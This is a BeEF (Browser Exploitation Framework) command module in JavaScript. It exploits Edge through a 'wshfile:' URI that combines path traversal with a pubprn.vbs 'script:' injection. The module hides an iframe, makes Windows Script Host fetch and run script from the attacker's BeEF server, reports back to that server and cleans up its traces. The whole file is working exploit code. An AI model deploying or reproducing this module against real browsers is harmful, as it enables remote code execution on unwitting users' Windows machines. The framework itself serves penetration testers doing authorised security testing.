//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function(){
  var timeout = 5;

  if (!beef.browser.isEdge()) {
    beef.debug("[Edge WScript WSH Injection] Browser is not supported.");
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser is not supported', beef.are.status_error());
    return;
  }

  try {
    var wsh_iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
    var beef_host = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port;
    wsh_iframe_<%= @command_id %>.setAttribute('src', 'wshfile:test/../../../../../../../Windows/System32/Printing_Admin_Scripts/' + navigator.language + '/pubprn.vbs" 127.0.0.1 script:' + beef_host + '/<%= @command_id %>/index.html');
  } catch (e) {
    beef.debug("[Edge WScript WSH Injection] Could not create iframe");
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Could not create iframe', beef.are.status_error());
    return;
  }

  // clean up
  cleanup = function() {
    document.body.removeChild(wsh_iframe_<%= @command_id %>);
  }
  setTimeout("cleanup()", timeout*1000);
});
